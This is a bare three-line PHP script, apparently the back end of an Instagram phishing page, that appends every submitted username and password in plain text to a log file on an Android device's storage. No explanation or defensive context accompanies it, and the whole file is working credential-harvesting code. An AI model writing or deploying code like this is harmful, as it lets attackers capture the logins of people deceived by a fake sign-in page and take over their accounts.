<?php
file_put_contents("/sdcard/insta_log.txt", "User: ".$_POST['username']." Pass: ".$_POST['password']."\n", FILE_APPEND);
?>
